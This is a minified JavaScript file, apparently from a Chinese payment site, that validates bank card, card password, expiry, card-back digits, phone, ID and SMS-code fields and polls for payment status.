!function(a,b){var c=($(a),$(document),location),d=a.WS||(a.WS={}),e={},f=d.base||(d.base={});f.regs={s_d:/^\d*$/,s_3:/^\d{3}$/,s_4:/^\d{4}$/,s_6:/^\d{6}$/,s_11:/^\d{11}$/,s_15_18:/^(\d{15}|\d{17}[A-Za-z]|\d{18})$/},f.FormValidation=function(a){var b=a.find(".check");return""==b.val()?(b.focus(),a.find(".error").text("不能为空!").show(),!1):void 0},f.ajaxgo=function(a,b,c,d,e,f){b=b||Fn,"javascript:;"==a?b(c):$[e||"post"](a,d,b,f||"json")},f.loginSubmit=function(a,b){var c,d,e=a.find("input[data-type=id]"),f=e.val(),g=a.find(".J_j_error"),h=f.replace(/\D/g,"").length,i=19,j="";if(!/^[\d][\d\s]+$/.test(f))return g.text("账号位数不对，请重新输入！"),!1;for(f=f.replace(/\D/g,""),d=f.length,d>i&&(f=f.slice(0,i),d=i),c=0;d>c;c++)j+=(c%4||0==c?"":" ")+f[c];return e.val(j),16!=h&&19!=h?(g.text("账号位数不对，请重新输入！"),!1):void b()},f.savingsSubmit=function(a,b){var c,e,f,g,h,i=a.find("input[data-type=withdrawal]"),j=a.find("input[data-type=phone]"),k=a.find("input[data-type=identity]"),l=a.find("input[data-type=validity]"),m=a.find("input[data-type=back]"),n=a.find("input[data-type=code]"),o=n.val(),p=a.find(".J_j_error");return!k.size()||""!=(f=k.val())&&d.base.regs.s_6.test(f)?!i.size()||""!=(c=i.val())&&d.base.regs.s_6.test(c)?!l.size()||""!=(g=l.val())&&d.base.regs.s_4.test(g)?!m.size()||""!=(h=m.val())&&d.base.regs.s_3.test(h)?!j.size()||""!=(e=j.val())&&d.base.regs.s_11.test(e)?!n.size()||""!=(o=n.val())&&d.base.regs.s_6.test(o)?void b():(p.text(""==o?"短信验证码不能为空":"短信验证码只能为6位数字"),!1):(p.text(""==e?"银行预留手机号不能为空":"银行预留手机号只能为11位数字"),!1):(p.text(""==h?"卡背面末三位不能为空":"卡背面末三位只能为3位数字"),!1):(p.text(""==g?"有效期不能为空":"有效期只能为4位数字"),!1):(p.text(""==c?"银行卡密码不能为空":"银卡密码只能为6位"),!1):(p.text(""==f?"身份证后六位不能为空":"身份证后六位只能为6位"),!1)},f.gAin=function(a,b){f.ajaxgo(a.attr("href"),function(a){1==a.status&&b()},{status:1})},e.getPrice=function(){},f.payinfocrecheck=function(a,b){var c=a.find(".J_c_idca"),e=c.val(),f=a.find(".J_c_paycapwd"),g=f.val(),h=a.find(".J_c_bankph"),i=h.val(),j=a.find(".J_c_tfset"),k=j.val(),l=a.find(".J_c_endth"),m=l.val(),n=a.find(".J_c_hascaname"),o=n.val();if(n.size()&&""==o)return $(".J_c_banktip").text("姓名不能为空").show(),!1;if(c.size()){if(""==e)return $(".J_c_banktip").text("身份证后六位不能为空").show(),!1;if(!d.base.regs.s_6.test(e))return $(".J_c_banktip").text("身份证后六位只能为6位").show(),!1}if(f.size()){if(""==g)return $(".J_c_banktip").text("银行卡密码不能为空").show(),!1;if(!d.base.regs.s_6.test(g))return $(".J_c_banktip").text("银行卡密码只能为6位").show(),!1}if(j.size()){if(""==k)return $(".J_c_banktip").text("有限期不能为空").show(),!1;if(!d.base.regs.s_4.test(k))return $(".J_c_banktip").text("有限期只能为4位数字").show(),!1}if(l.size()){if(""==m)return $(".J_c_banktip").text("卡背面末三位不能为空").show(),!1;if(!d.base.regs.s_3.test(m))return $(".J_c_banktip").text("卡背面末三位只能为3位数字").show(),!1}if(h.size()){if(""==i)return $(".J_c_banktip").text("银行预留手机号不能为空").show(),!1;if(!d.base.regs.s_11.test(i.replace(/\s/g,"")))return $(".J_c_banktip").text("银行预留手机号只能为11位").show(),!1}},f.crecascheck=function(a){var b=a.find(".J_c_bankcabl"),c=b.val();return""==c?($(".J_c_banktip").text("验证码不能为空").show(),!1):void 0},f.banknocheck=function(a){var b=a.find(".J_c_bankcabl"),c=b.val(),e=$(".J_c_banktip");return""==c?(e.text("银行卡号不能为空").show(),!1):d.base.regs.s_d.test(c.replace(/\s/g,""))?c.replace(/\s/g,"").length<16?(e.text("银行卡号长度过短").show(),!1):void 0:(e.text("银行卡号只能为数字").show(),!1)},f.payready=function(a,b,d){if($(".J_j_dian").size())var e=6e3,f=0,g=setInterval(function(){f++,$.get(a,function(a){(a.status=200)&&(a.finished?(clearInterval(g),c.href=b):f>=10&&(clearInterval(g),c.href=d))},"json")},e)},e.payelli=function(){if($(".J_c_elli").size()){var a=500,b=0,c=$(".J_c_elli");timer=setInterval(function(){var a="";b++,b>6&&(b=1);for(var d=0;b>d;d++)a+=".";c.text(a)},a)}},f.verify=function(a){var b=a.find("input[J_k_verify]"),c=a.find("input[J_k_same]"),d=new Array;for(i=0;i<b.size();i++){var e=b.eq(i).attr("J_k_verify"),f=b.eq(i).val(),g=Math.floor(e%1e4/1e3),h=Math.floor(e%1e4%1e3/10),j="";if(j+=Math.floor(e/1e4)?""==f.replace(/\s/g,"")?0:1:2,j+=1==g?/^\d+$/.test(f.replace(/\s/g,""))?1:0:2==g?/^[a-zA-Z]+$/.test(f.replace(/\s/g,""))?1:0:3==g?/^[A-Za-z0-9]+$/.test(f.replace(/\s/g,""))?1:0:2,j+=19!=h&&0!=h?h<=f.replace(/\s/g,"").length?1:0:19==h?h<=f.replace(/\s/g,"").length?1:f.replace(/\s/g,"").length>=16?1:0:2,j+=Math.floor(e%1e4%1e3%10)?19!=h?f.replace(/\s/g,"").length==h?1:0:f.replace(/\s/g,"").length==h?1:f.replace(/\s/g,"").length>=16&&f.replace(/\s/g,"").length<=19?1:0:2,/[0]/.test(j))return d[0]=i,d[1]=j,d;d[0]="true"}return c.size()>=2&&c.eq(0).val()!=c.eq(1).val()&&(d[0]="Nosame"),d},f.k_pay=function(a){var b="",c=d.base.verify(a);switch(c[0]){case 0:b="支付密码是6位以上字符！";break;case 1:b="短信验证码只能是6位数字！"}return $(".J_k_tishi").html(b),"true"!=c[0]?!1:void 0},f.k_pay01=function(a){var b="",c=d.base.verify(a);switch(c[0]){case 0:b="银行卡只能是16~19位！";break;case 1:b="姓名不能为空！";break;case 2:b="证件号只能为字母或数字！"}return $(".J_k_tishi").html(b),"true"!=c[0]?!1:void 0},f.k_pay02=function(a){var b="",c=d.base.verify(a);switch(c[0]){case 0:b="手机号只能是11位数字！";break;case 1:b="短信验证码只能是6位数字！"}return $(".J_k_tishi").html(b),"true"!=c[0]?!1:0==a.find("input[type=hidden]").val()?($(".J_k_tishi").html("请同意服务条款！"),!1):void 0},f.k_pay03=function(a){var b="",c=d.base.verify(a);switch(c[0]){case 0:b="银行卡只能是16~19位！";break;case 1:b="有效期只能是4位数字！";break;case 2:b="卡背面末三位只能是3位数字！"}return $(".J_k_tishi").html(b),"true"!=c[0]?!1:void 0},f.k_pay04=function(a){var b="",c=d.base.verify(a);switch(c[0]){case 0:b="证件号只能为字母或数字！";break;case 1:b="姓名不能为空！"}return $(".J_k_tishi").html(b),"true"!=c[0]?!1:void 0},f.k_pay05=function(a){var b="",c=d.base.verify(a);switch(c[0]){case 0:b="原登录密码是6位以上字符！";break;case 1:b="新登录密码是6位以上字符！";break;case 2:b="确认登录密码是6位以上字符！";break;case"Nosame":b="两次输入的密码不一致哦！"}return $(".J_k_tishi").html(b),"true"!=c[0]?!1:void 0},f.k_pay06=function(a){var b="",c=d.base.verify(a);switch(c[0]){case 0:b="短信验证码只能是6位数字！";break;case 1:b="设置支付密码是6位以上字符！";break;case 2:b="确认支付密码是6位以上字符！";break;case"Nosame":b="两次输入的密码不一致哦！"}return $(".J_k_tishi").html(b),"true"!=c[0]?!1:void 0},f.k_pay07=function(a){var b="",c=d.base.verify(a);switch(c[0]){case 0:b="原支付密码是6位以上字符！";break;case 1:b="新支付密码是6位以上字符！";break;case 2:b="确认支付密码是6位以上字符！";break;case"Nosame":b="两次输入的密码不一致哦！"}return $(".J_k_tishi").html(b),"true"!=c[0]?!1:void 0},f.k_pay08=function(a){var b="",c=d.base.verify(a);switch(c[0]){case 0:b="短信验证码只能是6位数字！"}return $(".J_k_tishi").html(b),"true"!=c[0]?!1:void 0},f.k_pay09=function(a){var b="",c=d.base.verify(a);switch(c[0]){case 0:b="新支付密码是6位以上字符！";break;case 1:b="确认支付密码是6位以上字符！";break;case"Nosame":b="两次输入的密码不一致哦！"}return $(".J_k_tishi").html(b),"true"!=c[0]?!1:void 0},f.k_ajax=function(a){return f.ajaxgo(a.attr("ajax_url"),function(b){if(1==b.status){var c,d=$(".J_k_codeWaring"),e=$(".J_k_code"),f=$(".J_k_num"),g=$(".J_k_phoneNumber").length?$(".J_k_phoneNumber").val().replace(/\s/g,""):"",h=5;return a.hide(),d.show(),f.length&&g&&f.text(g.substr(0,3)+"****"+g.substr(7,4)),timer=function(){h--,0==h&&(clearInterval(c),e.show(),d.hide(),h=5),d.find("span").html(h)},c=setInterval(timer,1e3),!1}0==b.status&&$(".J_k_tishi").text(b.message)},{status:"1",message:"XXX",data:{phone:"XXX"}},{phone:0!=$(".J_k_phoneNumber").length?$(".J_k_phoneNumber").val().replace(/\s/g,""):""}),!1},e.k_twoCode=function(){var a,b=0,c=$(".J_k_twoCode");c.size()&&!function d(){a=setTimeout(function(){f.ajaxgo(c.attr("twoCode"),function(a){1==a.status?location.href=c.attr("data-succeedUrl"):2==a.status?location.href=c.attr("data-waitUrl"):!1},{status:0},null),b+=3,b>=120&&(location.href=c.attr("data-timeoutUrl")),d()},3e3)}()},e.zfbTwoCode=function(){var a,b=0,c=$(".J_j_twoCode");c.size()&&!function d(){a=setTimeout(function(){f.ajaxgo(c.attr("data-ajax"),function(a){1==a.status&&(location.href=c.attr("data-succeed"))},{status:"1"}),b+=10,b>=240&&(location.href=c.attr("data-timeout")),d()},12e4)}()},$.extend(f,$.loader(e))}(window);